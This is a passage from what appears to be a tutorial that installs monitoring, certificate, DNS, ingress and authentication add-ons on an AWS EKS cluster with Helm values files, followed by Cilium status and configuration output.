MAILHOG_HELM_CHART_VERSION=\"5.2.3\" helm repo add --force-update codecentric https://codecentric.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" &lt;&lt; EOF image: repository: docker.io/cd2team/mailhog tag: \"1663459324\" ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailhog nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hosts: - host: mailhog.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - mailhog.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILHOG_HELM_CHART_VERSION}\" --namespace mailhog --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" mailhog codecentric/mailhog kube-prometheus-stack The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It‚Äôs combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Endpoint ports: 10260 (kube-prometheus-stack-operator/https) 8080 (kube-prometheus-stack-prometheus/reloader-web) 9090 (kube-prometheus-stack-prometheus/http-web) 8080 (kube-prometheus-stack-kube-state-metrics/http) 9100 (kube-prometheus-stack-prometheus-node-exporter/http-metrics) 10250 (kube-prometheus-stack-kubelet/https-metrics) -&gt; 10253 (conflicts with kubelet, cert-manager, ‚Ä¶) 10255 (kube-prometheus-stack-kubelet/http-metrics) 4194 (kube-prometheus-stack-kubelet/cadvisor) 8081 (kube-prometheus-stack-kube-state-metrics/telemetry-port) -&gt; 8082 (conflicts with karpenter) Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailhog.mailhog.svc.cluster.local:1025\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email-notifications routes: - receiver: email-notifications matchers: [ '{severity=~\"warning|critical\"}' ] receivers: - name: email-notifications email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 33 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 16611-cilium-metrics: # renovate: depName=\"Cilium v1.12 Agent Metrics\" gnetId: 16611 revision: 1 datasource: Prometheus 16612-cilium-operator: # renovate: depName=\"Cilium v1.12 Operator Metrics\" gnetId: 16612 revision: 1 datasource: Prometheus 16613-hubble: # renovate: depName=\"Cilium v1.12 Hubble Metrics\" gnetId: 16613 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 18855-fluent-bit: # renovate: depName=\"Fluent Bit\" gnetId: 18855 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailhog.mailhog.svc.cluster.local:1025\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: hostNetwork: true networkPolicy: enabled: true selfMonitor: enabled: true telemetryPort: 8082 prometheus-node-exporter: networkPolicy: enabled: true hostNetwork: true prometheusOperator: tls: # https://github.com/prometheus-community/helm-charts/issues/2248 internalPort: 10253 networkPolicy: enabled: true hostNetwork: true prometheus: networkPolicy: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi hostNetwork: true EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Endpoint ports: 8000 (http-metrics) 8081 8443 (https-webhook) -&gt; 8444 (conflicts with ingress-nginx) Customize the Karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true hostNetwork: true webhook: port: 8444 settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter Cilium - monitoring Add Hubble to Cilium, enabling Prometheus metrics and other observability features: helm repo add --force-update cilium https://helm.cilium.io/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" &lt;&lt; EOF hubble: metrics: serviceMonitor: enabled: true enabled: - dns - drop - tcp - flow - icmp - http prometheus: enabled: true serviceMonitor: enabled: true relay: enabled: true prometheus: enabled: true serviceMonitor: enabled: true ui: enabled: true ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cilium/hubble/83a6345a7100531d4e8c54ba0a92352051b8c861/Documentation/images/hubble_logo.png forecastle.stakater.com/appName: Hubble UI nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri className: nginx hosts: - hubble.${CLUSTER_FQDN} tls: - hosts: - hubble.${CLUSTER_FQDN} prometheus: enabled: true serviceMonitor: enabled: true envoy: prometheus: enabled: true serviceMonitor: enabled: true operator: prometheus: enabled: true serviceMonitor: enabled: true EOF helm upgrade --install --version \"${CILIUM_HELM_CHART_VERSION}\" --namespace cilium --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" cilium cilium/cilium aws-for-fluent-bit Fluent Bit is an open-source log processor and forwarder that allows you to collect data like metrics and logs from different sources, enrich it with filters, and send it to multiple destinations. Endpoint ports: 2020 (monitor-agent) Install the aws-for-fluent-bit Helm chart and modify its default values: # renovate: datasource=helm depName=aws-for-fluent-bit registryUrl=https://aws.github.io/eks-charts AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION=\"0.1.32\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" &lt;&lt; EOF cloudWatchLogs: region: ${AWS_DEFAULT_REGION} logGroupTemplate: \"/aws/eks/${CLUSTER_NAME}/cluster\" logStreamTemplate: \"\\$kubernetes['namespace_name'].\\$kubernetes['pod_name']\" serviceAccount: create: false name: aws-for-fluent-bit hostNetwork: true dnsPolicy: ClusterFirstWithHostNet serviceMonitor: enabled: true extraEndpoints: - port: metrics path: /metrics interval: 30s scrapeTimeout: 10s scheme: http EOF helm upgrade --install --version \"${AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION}\" --namespace aws-for-fluent-bit --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" aws-for-fluent-bit eks/aws-for-fluent-bit cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. Endpoint ports: 10250 (cert-manager-webhook/https) -&gt; 10251 (conflicts with kube-prometheus-stack-kubelet/https-metrics) The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: securePort: 10251 hostNetwork: true networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let‚Äôs Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Endpoint ports: 80 (http) 443 (https) 8443 (https-webhook) 10254 (metrics) Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: hostNetwork: true allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.136\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle oauth2-proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.1\" helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: \"$(openssl rand -base64 32 | head -c 32 | base64)\" configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Cilium details Let‚Äôs check the Cilium status using the Cilium CLI: cilium status -n cilium /¬Ø¬Ø\\ /¬Ø¬Ø\\__/¬Ø¬Ø\\ Cilium: OK \\__/¬Ø¬Ø\\__/ Operator: OK /¬Ø¬Ø\\__/¬Ø¬Ø\\ Envoy DaemonSet: disabled (using embedded mode) \\__/¬Ø¬Ø\\__/ Hubble Relay: OK \\__/ ClusterMesh: disabled Deployment hubble-ui Desired: 1, Ready: 1/1, Available: 1/1 Deployment hubble-relay Desired: 1, Ready: 1/1, Available: 1/1 Deployment cilium-operator Desired: 1, Ready: 1/1, Available: 1/1 DaemonSet cilium Desired: 2, Ready: 2/2, Available: 2/2 Containers: hubble-relay Running: 1 cilium-operator Running: 1 cilium Running: 2 hubble-ui Running: 1 Cluster Pods: 18/18 managed by Cilium Helm chart version: 1.14.0 Image versions hubble-relay quay.io/cilium/hubble-relay:v1.14.0@sha256:bfe6ef86a1c0f1c3e8b105735aa31db64bcea97dd4732db6d0448c55a3c8e70c: 1 cilium-operator quay.io/cilium/operator-aws:v1.14.0@sha256:396953225ca4b356a22e526a9e1e04e65d33f84a0447bc6374c14da12f5756cd: 1 cilium quay.io/cilium/cilium:v1.14.0@sha256:5a94b561f4651fcfd85970a50bc78b201cfbd6e2ab1a03848eab25a82832653a: 2 hubble-ui quay.io/cilium/hubble-ui:v0.12.0@sha256:1c876cfa1d5e35bc91e1025c9314f922041592a88b03313c22c1f97a5d2ba88f: 1 hubble-ui quay.io/cilium/hubble-ui-backend:v0.12.0@sha256:8a79a1aad4fc9c2aa2b3e4379af0af872a89fcec9d99e117188190671c66fc2e: 1 The Cilium configuration can be found in the cilium-config ConfigMap: kubectl -n cilium get configmap cilium-config -o yaml apiVersion: v1 data: agent-not-ready-taint-key: node.cilium.io/agent-not-ready arping-refresh-period: 30s auto-create-cilium-node-resource: \"true\" auto-direct-node-routes: \"false\" aws-enable-prefix-delegation: \"true\" aws-release-excess-ips: \"true\" bpf-lb-external-clusterip: \"false\" bpf-lb-map-max: \"65536\" bpf-lb-sock: \"false\" bpf-map-dynamic-size-ratio: \"0.0025\" bpf-policy-map-max: \"16384\" bpf-root: /sys/fs/bpf cgroup-root: /run/cilium/cgroupv2 cilium-endpoint-gc-interval: 5m0s cluster-id: \"0\" cluster-name: k01 cni-exclusive: \"true\" cni-log-file: /var/run/cilium/cilium-cni.log cnp-node-status-gc-interval: 0s custom-cni-conf: \"false\" debug: \"false\" debug-verbose: \"\" disable-cnp-status-updates: \"true\" ec2-api-endpoint: \"\" egress-gateway-reconciliation-trigger-interval: 1s egress-masquerade-interfaces: eth0 enable-auto-protect-node-port-range: \"true\" enable-bandwidth-manager: \"true\" enable-bbr: \"false\" enable-bgp-control-plane: \"false\" enable-bpf-clock-probe: \"false\" enable-endpoint-health-checking: \"true\" enable-endpoint-routes: \"true\" enable-health-check-nodeport: \"true\" enable-health-checking: \"true\" enable-hubble: \"true\" enable-hubble-open-metrics: \"false\" enable-ipv4: \"true\" enable-ipv4-big-tcp: \"false\" enable-ipv4-masquerade: \"true\" enable-ipv6: \"false\" enable-ipv6-big-tcp: \"false\" enable-ipv6-masquerade: \"true\" enable-k8s-networkpolicy: \"true\" enable-k8s-terminating-endpoint: \"true\" enable-l2-neigh-discovery: \"true\" enable-l7-proxy: \"true\" enable-local-redirect-policy: \"false\" enable-metrics: \"true\" enable-policy: default enable-remote-node-identity: \"true\" enable-sctp: \"false\" enable-svc-source-range-check: \"true\" enable-vtep: \"false\" enable-well-known-identities: \"false\" enable-wireguard: \"true\" enable-xt-socket-fallback: \"true\" eni-tags: '{\"cluster\":\"k01.k8s.mylabs.dev\",\"owner\":\"petr.ruzicka@gmail.com\",\"product_id\":\"12345\",\"used_for\":\"dev\"}' external-envoy-proxy: \"false\" hubble-disable-tls: \"false\" hubble-listen-address: :4244 hubble-metrics: dns drop tcp flow icmp http hubble-metrics-server: :9965 hubble-socket-path: /var/run/cilium/hubble.sock hubble-tls-cert-file: /var/lib/cilium/tls/hubble/server.crt hubble-tls-client-ca-files: /var/lib/cilium/tls/hubble/client-ca.crt hubble-tls-key-file: /var/lib/cilium/tls/hubble/server.key identity-allocation-mode: crd identity-gc-interval: 15m0s identity-heartbeat-timeout: 30m0s install-no-conntrack-iptables-rules: \"false\" ipam: eni ipam-cilium-node-update-rate: 15s k8s-client-burst: \"10\" k8s-client-qps: \"5\" kube-proxy-replacement: disabled mesh-auth-enabled: \"true\" mesh-auth-gc-interval: 5m0s mesh-auth-queue-size: \"1024\" mesh-auth-rotated-identities-queue-size: \"1024\" monitor-aggregation: medium monitor-aggregation-flags: all monitor-aggregation-interval: 5s node-port-bind-protection: \"true\" nodes-gc-interval: 5m0s operator-api-serve-addr: 127.0.0.1:9234 operator-prometheus-serve-addr: :9963 preallocate-bpf-maps: \"false\" procfs: /host/proc prometheus-serve-addr: :9962 proxy-connect-timeout: \"2\" proxy-max-connection-duration-seconds: \"0\" proxy-max-requests-per-connection: \"0\" proxy-prometheus-port: \"9964\" remove-cilium-node-taints: \"true\" routing-mode: native set-cilium-is-up-condition: \"true\" set-cilium-node-taints: \"true\" sidecar-istio-proxy-image: cilium/istio_proxy skip-cnp-status-startup-clean: \"false\" synchronize-k8s-nodes: \"true\" tofqdns-dns-reject-response-code: refused tofqdns-enable-dns-compression: \"true\" tofqdns-endpoint-max-ip-per-hostname: \"50\" tofqdns-idle-connection-grace-period: 0s tofqdns-max-deferred-connection-deletes: \"10000\" tofqdns-proxy-response-max-delay: 100ms unmanaged-pod-watcher-interval: \"15\" update-ec2-adapter-limit-via-api: \"true\" vtep-cidr: \"\" vtep-endpoint: \"\" vtep-mac: \"\" vtep-mask: \"\" write-cni-conf-when-ready: /host/etc/cni/net.d/05-cilium.conflist kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: cilium meta.helm.sh/release-namespace: cilium creationTimestamp: \"2023-08-18T17:02:55Z\" labels: app.kubernetes.io/managed-by: Helm name: cilium-config namespace: cilium resourceVersion: \"5229\" uid: 9d1392b8-6a3b-403c-81ce-500393eeb3e3 Here‚Äôs a different way to run cilium status on a Kubernetes worker node: kubectl exec -n cilium ds/cilium -- cilium status Defaulted container \"cilium-agent\" out of: cilium-agent, config (init), mount-cgroup (init), apply-sysctl-overwrites (init), mount-bpf-fs (init), clean-cilium-state (init), install-cni-binaries (init) KVStore: Ok Disabled Kubernetes: Ok 1.25+ (v1.25.12-eks-2d98532) [linux/amd64] Kubernetes APIs: [\"EndpointSliceOrEndpoint\", \"cilium/v2::CiliumClusterwideNetworkPolicy\", \"cilium/v2::CiliumEndpoint\", \"cilium/v2::CiliumNetworkPolicy\", \"cilium/v2::CiliumNode\", \"cilium/v2alpha1::CiliumCIDRGroup\", \"core/v1::Namespace\", \"core/v1::Pods\", \"core/v1::Service\", \"networking.k8s.io/v1::NetworkPolicy\"] KubeProxyReplacement: Disabled Host firewall: Disabled CNI Chaining: none Cilium: Ok 1.14.0 (v1.14.0-b5013e15) NodeMonitor: Listening for events on 2 CPUs with 64x4096 of shared memory Cilium health daemon: Ok IPAM: IPv4: 9/32 allocated, IPv4 BIG TCP: Disabled IPv6 BIG TCP: Disabled BandwidthManager: EDT with BPF [CUBIC] [eth0] Host Routing: Legacy Masquerading: IPTables [IPv4: Enabled, IPv6: Disabled] Controller Status: 55/55 healthy Proxy Status: OK, ip 192.168.8.67, 0 redirects active on ports 10000-20000, Envoy: embedded Global Identity Range: min 256, max 65535 Hubble: Ok Current/Max Flows: 4095/4095 (100.00%), Flows/s: 8.21 Metrics: Ok Encryption: Wireguard [NodeEncryption: Disabled, cilium_wg0 (Pubkey: AxE7xXNN/Izr5ajkE48eSWtOH2WeQBTwhjS3Rma1tDo=, Port: 51871, Peers: 1)] Cluster health: 2/2 reachable (2023-08-18T17:53:44Z) Useful details about Cilium networking can be found by listing the ciliumnodes CRD: kubectl describe ciliumnodes.cilium.io Name: ip-192-168-19-152.ec2.internal Namespace: Labels: alpha.eksctl.io/cluster-name=k01 alpha.eksctl.io/nodegroup-name=mng01-ng beta.kubernetes.io/arch=arm64 beta.kubernetes.io/instance-type=t4g.medium beta.kubernetes.io/os=linux eks.amazonaws.com/capacityType=ON_DEMAND eks.amazonaws.com/nodegroup=mng01-ng eks.amazonaws.com/nodegroup-image=ami-05d67a5609bec1651 eks.amazonaws.com/sourceLaunchTemplateId=lt-077e09aaa2d4af922 eks.amazonaws.com/sourceLaunchTemplateVersion=1 failure-domain.beta.kubernetes.io/region=us-east-1 failure-domain.beta.kubernetes.io/zone=us-east-1a 